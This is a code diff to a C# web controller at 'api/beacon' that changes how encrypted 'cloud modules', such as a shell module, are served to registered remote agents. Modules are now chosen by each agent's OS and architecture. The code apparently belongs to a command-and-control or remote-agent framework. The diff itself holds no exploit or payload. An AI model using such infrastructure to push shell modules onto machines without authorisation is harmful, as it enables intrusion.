@@ -13,8 +13,6 @@ namespace LibraNextgen.Service.Controllers;
 [Route("api/beacon")]
 public class AgentCommsController : ControllerBase
 {
-    private static readonly string ModulesDir = Path.GetFullPath(
-        Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "build-output", "modules"));
     private static readonly string BuildsDir = Path.GetFullPath(
         Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "build-output"));
 
@@ -22,17 +20,20 @@ public class AgentCommsController : ControllerBase
     private readonly AgentTrafficService _traffic;
     private readonly ConnectionManager _wsManager;
     private readonly BeaconSettings _beaconSettings;
+    private readonly AgentService _agentService;
 
     public AgentCommsController(
         AgentCommsService commsService,
         AgentTrafficService traffic,
         ConnectionManager wsManager,
-        IOptions<BeaconSettings> beaconSettings)
+        IOptions<BeaconSettings> beaconSettings,
+        AgentService agentService)
     {
         _commsService = commsService;
         _traffic = traffic;
         _wsManager = wsManager;
         _beaconSettings = beaconSettings.Value;
+        _agentService = agentService;
     }
 
     [HttpPost("register")]
@@ -190,10 +191,11 @@ public class AgentCommsController : ControllerBase
 
     /// <summary>
     /// Serve a cloud module (e.g. "shell") to an authenticated agent. The module
-    /// binary is encrypted with the agent's session key on the fly.
+    /// binary is encrypted with the agent's session key on the fly. Modules are
+    /// resolved from the platform directory matching the agent's own platform.
     /// </summary>
     [HttpGet("module/{name}")]
-    public IActionResult DownloadModule(string name)
+    public async Task<IActionResult> DownloadModule(string name)
     {
         var agentId = Request.Headers["X-Agent-Id"].FirstOrDefault();
         if (string.IsNullOrEmpty(agentId))
@@ -205,14 +207,38 @@ public class AgentCommsController : ControllerBase
         if (string.IsNullOrEmpty(name) || name.Any(c => !(char.IsAsciiLetterOrDigit(c) || c == '-' || c == '_')))
             return BadRequest(new { error = "invalid module name" });
 
-        var ext = OperatingSystem.IsWindows() ? "dll" : OperatingSystem.IsMacOS() ? "dylib" : "so";
-        var modulePath = Path.Combine(ModulesDir, $"{name}.{ext}");
+        // Resolve the agent's platform so the correct artifact set is served.
+        var platform = await ResolveAgentPlatformAsync(agentId);
+        if (platform == null)
+            return NotFound(new { error = "agent platform unknown" });
+
+        var modulesDir = Path.Combine(BuildsDir, "modules", platform);
+        var ext = platform.StartsWith("linux") ? "so" : "dll";
+        var modulePath = Path.Combine(modulesDir, $"{name}.{ext}");
         if (!System.IO.File.Exists(modulePath))
             return NotFound(new { error = "module not found" });
 
         var bytes = System.IO.File.ReadAllBytes(modulePath);
         var payload = CryptoHelper.EncryptBytes(bytes, key);
         return Ok(new { payload });
+    }
+
+    private async Task<string?> ResolveAgentPlatformAsync(string agentId)
+    {
+        var agent = await _agentService.GetByIdAsync(agentId);
+        if (agent == null) return null;
+
+        var os = agent.OsVersion ?? "";
+        var arch = agent.Arch ?? "";
+        if (os.Contains("Linux", StringComparison.OrdinalIgnoreCase))
+            return "linux-x64";
+        if (os.Contains("Windows", StringComparison.OrdinalIgnoreCase) || os.Contains("win32", StringComparison.OrdinalIgnoreCase))
+            return arch.Contains("86") && !arch.Contains("64") ? "x86" : "x64";
+
+        // Fall back to a host-based guess.
+        return OperatingSystem.IsWindows()
+            ? (arch.Contains("86") && !arch.Contains("64") ? "x86" : "x64")
+            : "linux-x64";
     }
 
     private bool IsSecretRequired() => !string.IsNullOrWhiteSpace(_beaconSettings.Secret);
